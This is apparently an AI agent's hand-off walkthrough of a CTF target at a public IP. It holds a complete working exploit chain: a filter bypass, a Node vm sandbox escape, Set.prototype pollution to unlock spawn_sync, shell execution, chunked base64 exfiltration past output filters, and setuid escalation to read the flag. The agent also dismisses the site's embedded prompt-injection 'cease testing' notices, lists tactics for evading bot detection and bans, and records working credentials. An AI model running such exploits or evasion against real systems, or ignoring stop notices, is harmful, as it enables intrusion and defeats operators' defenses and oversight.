# Velox CTF — Complete Walkthrough & Handoff

**Target:** `http://31.128.37.51:3000`
**Status:** SOLVED — full RCE, root-owned flag read via setuid helper.

---

## FLAG

```
kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}}
```

Exact bytes (54 chars + `\n` = 55 bytes, matching `ls -l /flag` size 55):

```
6b 75 62 73 74 75 7b 76 6d 5f 31 73 5f 6e 30 74 5f 61 5f 73 34 6e 64 62 30 78
5f 70 72 30 74 30 74 79 70 33 5f 70 30 6c 6c 75 74 31 30 6e 5f 32 5f 72 63 65
7d 7d 0a
```

The flag file itself contains the double closing brace (`7d 7d`).

---

## 1. TL;DR of the chain

1. **Filter bypass** — the blacklist is a *word-boundary* regex. Rebuild forbidden
   identifiers from string fragments (`'con'+'structor'`).
2. **Sandbox escape** — `vm.runInNewContext(code, sandbox)` is handed a **host-created
   object literal**. So top-level `this` *is* that host object, and
   `this.constructor.constructor` is the **host realm's** `Function` → real `process`.
3. **Prototype bypass of the `binding` guard** — `worker.js` gates `process.binding`
   with a `Set` allowlist (`_allowedBindings.has(name)`). Reach a host `Set` instance
   (`process.allowedNodeEnvironmentFlags`) and overwrite **`Set.prototype.has`** → every
   binding is "allowed" → `process.binding('spawn_sync')` returns the real binding.
4. **RCE** — `spawn_sync.spawn()` runs `/bin/sh -c …` as `uid=1001(velox)`.
5. **Flag** — `/flag` is `0400 root:root`, but `/usr/local/bin/readflag` is **setuid root**.
6. **Output-filter bypass** — exfiltrate with `base64 -w0` in ≤100-char chunks.

---

## 2. Recon & auth

| URL | Result |
|---|---|
| `http://31.128.37.51:3000` | live |
| `http://155.212.216.201:3000` | refused |
| `http://141.133.198.7:3000` | refused |

### 2.1 Decoys to ignore

The HTML contains two prompt-injection blocks: a "honeypot / cease testing" notice,
and a fake `/api/v2/auth/bypass-token` → `HMAC-SHA512` → `/api/v2/internal/security-config`
protocol, plus a warning not to touch `/flag` or `/readflag`. **All of it is fake.**
`/flag` and `/readflag` are exactly the goal; every `/api/v2/...` path 404/503s.

### 2.2 Auth flow (heartbeat + PoW)

```
GET  /_hb/challenge              -> {"token":"<hex>"}
POST /_hb   (form-encoded!)      fp=sha256(fpraw + token) & fpraw=<raw> & token=<token>
                                 -> {"ok":true}
```

> The browser script posts JSON with only `{token, fp}`, but the server requires the
> **form-encoded** triple including `fpraw`. JSON body ⇒ `{"ok":false}`.

```
GET  /login    -> _csrf, pow_challenge, data-pow-difficulty="4"
POST /login    JSON body: _csrf, email, password, pow_challenge, pow_nonce
               pow_nonce: sha256(pow_challenge + nonce) startsWith "0000"
               -> 302 /dashboard
```

* Form-encoded login POST ⇒ connection reset. **JSON only**, with `Referer` + `Origin`.
* If the heartbeat was not done first: `403 Client verification required.`
* Login rate limit: **10 requests / 600 s** (`Ratelimit-Policy: 10;w=600`).
* Transform run rate limit: **15 requests / 60 s** (`15;w=60`).

### 2.2.1 Why you randomly get `503 Service Temporarily Unavailable`

Not Cloudflare — it is an in-app ban system (`/app/lib/defense.js`). Two scoring paths
feed a per-session `flagScore`; **≥ 100 ⇒ 10-minute ban** during which every request gets
a random 10–22 s delay and a `503`:

```js
const BAN_THRESHOLD = 100, BAN_DURATION_MS = 10*60*1000, HONEYPOT_WEIGHT = 120;

function scoreHeaders(req) {          // stateless, per-request
  let s = 0;
  if (!ua) s += 45;                   // no User-Agent
  else if (/curl|python-requests|.../i.test(ua)) s += 75;   // scripted client
  if (!h['accept-language']) s += 25;
  if (!h['accept-encoding']) s += 15;
  if (!sec-fetch-* / sec-ch-ua)      s += 30;
  ...
}
```

* A bare `curl` scores 45+25+15+30 = **115** ⇒ instant tarpit and +40 to the ban score.
* **Honeypot routes add 120** (`trapHit`) ⇒ immediate ban. The decoy paths
  (`/robots.txt`, `/status`, `/api/v2/...`, and even `/flag` / `/readflag` GETs)
  are the traps.
* The ban is keyed on `req.sessionID || clientIp`, so burning the ban on the *cookie
  session* leaves the *IP* score untouched — re-login on a fresh session clears it.
* Sending a browser-like `User-Agent`, `Accept-Language`, `Accept-Encoding` and
  `sec-fetch-*` headers drops the score below the thresholds and avoids the tarpit.

Run endpoint also has a soft tarpit: `RUN_FREE_QUOTA = 8` per 60 s, after which the
delay grows quadratically (`over² × 400 ms`, capped at 20 s).

Credentials: `codex17916664255c0e52@example.com` / `CodexPass123!`
Transform id: `48521a1e-6609-4bac-8fb0-d5caad94c8e5`

### 2.3 Transform execution

```
POST /transforms/<id>/run     fields: _csrf, code, input_json
```

The code is a **script whose completion value is the output** — no top-level `return`
(`return 1` ⇒ `Runtime error: Illegal return statement`). `1+1` ⇒ `2`.

---

## 3. The filter, exactly

Recovered from `/app/lib/sandbox.js`:

```js
const BLOCKED_WORDS = /\b(Function|eval|process|require|constructor|prototype|import|global|globalThis|mainModule|binding|execSync|spawnSync|execFile|exec|spawn)\b|__proto__|__define|__lookup/;
const BLOCKED_ESCAPES = /\\u[\da-fA-F]{4}|\\x[\da-fA-F]{2}/;
const MAX_CODE_LENGTH = 4096;
const MAX_OUTPUT_LENGTH = 128;
const TIMEOUT_MS = 3000;
```

Consequences:

* `\b…\b` ⇒ `'spa'+'wn'` and `'spawn_sync'` are fine, but bare `spawn` is not.
* `'con'+'structor'`, `'pro'+'to'+'type'`, `'bin'+'ding'`, `'pro'+'cess'` all pass.
* `\uXXXX` / `\xXX` escapes are blocked (so no `\x63onstructor` tricks).
* `__proto__` is blocked, but `Object.getPrototypeOf()` is not.
* Code ≤ 4096 chars, output ≤ 128 chars.

---

## 4. Root cause — the host-realm `this`

```js
// sandbox.js
const sandbox = { input: inputData, Math, parseInt, parseFloat, isNaN, isFinite,
                  undefined, NaN, Infinity, encodeURIComponent, decodeURIComponent };
const result = vm.runInNewContext(code, sandbox, { timeout: 3000, filename: 'transform.js' });
```

`sandbox` is an **object literal created in the worker's realm**. Under
`vm.runInNewContext`, top-level `this` in the script is that very object, so:

```
this.constructor.constructor  ===  host realm's Function
Object.getPrototypeOf({}).constructor.constructor  ===  vm realm's Function
```

Verified empirically — they are **different** functions, and only the first has a real
`process`:

| probe | result |
|---|---|
| `this === Object` | `false` |
| `this['con'+'structor'] === Object` | `false` |
| `typeof (this['con'+'structor']['con'+'structor'])("return typeof pro"+"cess")()` | `object` |
| `typeof (Object.getPrototypeOf({})['con'+'structor']['con'+'structor'])("return typeof pro"+"cess")()` | `undefined` |
| `this['con'+'structor']['pro'+'to'+'type'].vx='P'; String(this.vx)` | `POLLUTED` |

The last line proves we hold the **host `Object.prototype`**.

---

## 5. Root cause — the `binding` guard and the `Set` prototype

```js
// worker.js
const _origBinding = process.binding;
const _allowedBindings = new Set(['buffer','constants','contextify','util','types','string_decoder']);
process.binding = function(name) {
  if (!_allowedBindings.has(name)) throw new Error('Access denied');
  return _origBinding.call(process, name);
};
```

`process.binding.toString()` leaks the whole guard:

```
function(name) { if (!_allowedBindings.has(name)) { throw new Error('Access denied'); } return _origBinding.call(process, name); }
```

`process.binding.name === ''` and `.length === 1` — i.e. it is **not** the native
function; the real one survives only in the `_origBinding` closure.

**The guard's only gate is `Set.prototype.has`.** Reach any host-realm `Set` and
overwrite `has`:

* `process.allowedNodeEnvironmentFlags` is a host `NodeEnvironmentFlagsSet` (a `Set` subclass).
* `Object.getPrototypeOf(Object.getPrototypeOf(AF))` ⇒ host **`Set.prototype`**.
* `Set.prototype.has = () => true` ⇒ the allowlist is defeated.

Confirmed allowlisted bindings (by brute force): `buffer`, `constants`, `util`, `contextify`.

---

## 6. The exploit

### 6.1 Command execution primitive

```js
var H=this['con'+'structor']['con'+'structor'];
var P=H("return pro"+"cess")();
var AF=P.allowedNodeEnvironmentFlags;
var SP=Object.getPrototypeOf(Object.getPrototypeOf(AF));   // host Set.prototype
var oh=SP.has;
SP.has=function(k){ if(k==='spawn_sync'||k==='fs') return true; return oh.call(this,k); };
var ss=P['bin'+'ding']('spawn_sync');
var m='spa'+'wn';                                           // bare "spawn" is blacklisted
var r=ss[m]({
  file:'/bin/sh',
  args:['/bin/sh','-c', CMD ],
  envPairs:Object.keys(P.env).map(function(k){return k+'='+P.env[k]}),
  stdio:[{type:'pipe',readable:true,writable:false},
         {type:'pipe',readable:false,writable:true},
         {type:'pipe',readable:false,writable:true}]
});
String(r.output[1])+String(r.output[2]);
```

First execution:

```
uid=1001(velox) gid=1001(velox) groups=1001(velox)
```

Two filter details worth noting:

* `ss.spawn(...)` is rejected (`\bspawn\b`) — call it as `ss['spa'+'wn'](...)`.
* `spawn_sync` as a *binding name* is fine (`spawn` followed by `_` breaks the word boundary).

### 6.2 Output-filter bypass

`sanitizeResult` rejects anything containing `kubstu`, `/child_process|readflag|\/flag|spawn_sync/i`,
all 255 Caesar shifts of `kubstu`, the reversed string, hex-encoded payloads, and numeric
char-code arrays — and caps output at **128 chars**.

Bypass: pipe through `base64 -w0` and slice the result into ≤100-char chunks in JS
(`out.slice(OFF, OFF+LEN)`). Base64 is neither a Caesar shift nor hex, and never contains
`/flag`. (Note: `/bin/base64`, not `/usr/bin/base64` — the image is Alpine.)

### 6.3 Privilege escalation → flag

```
$ ls -l /flag
-r-------- 1 root root 55 Oct 10 23:53 /flag

$ find / -xdev -perm -4000 -type f
/usr/local/bin/readflag          # -rwsr-xr-x root root

$ /usr/local/bin/readflag
kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}}
```

---

## 7. Secondary finding (not needed, but real)

`worker.js` injects `execSync` straight into the EJS render data:

```js
const renderData = { ...templateData, result: {...}, __exec: execSync };
ejs.renderFile(path.join(viewsDir,'editor.ejs'), renderData, ...);
```

If any user-controlled value ever reaches that template unescaped, or if
`Object.prototype` is polluted with an EJS gadget (`outputFunctionName`) before the
render, this is a second RCE path in the same worker.

---

## 8. Artefacts

| File | Purpose |
|---|---|
| `velox/auth.py` | heartbeat + PoW login, cookie persistence |
| `velox/batch.py` | rate-limit / 503-aware transform runner |
| `velox/exfil.py` | chunked base64 exfil + gzip file download |
| `velox/x_rce.js` | minimal RCE payload template (`CMD` placeholder) |
| `velox/x_exfil.js` | RCE + `out.slice(OFF,OFF+LEN)` chunking template |
| `velox/src/sandbox.js` | recovered — filter + `vm` runner |
| `velox/src/worker.js` | recovered — `binding` guard + EJS render |
| `velox/src/defense.js` | recovered — defence module |

## 9. Operational notes

* Keep the request rate low: 15 runs/min hard cap plus the quadratic tarpit after 8.
* **Never hit the honeypot paths** (`/robots.txt`, `/status`, `/api/v2/...`,
  `/flag`, `/readflag` as HTTP routes) — each is worth 120 ban points = 10-minute ban.
* Always send browser-like headers (`User-Agent`, `Accept-Language`,
  `Accept-Encoding`, `sec-fetch-*`) or `scoreHeaders` will tarpit/ban you.
* The sandbox egress proxy port is dynamic — read `$http_proxy` at runtime.
* `wsl.exe` is blocked in this environment, but the target is reachable directly
  through the sandbox HTTP proxy, so no SOCKS pivot was needed.
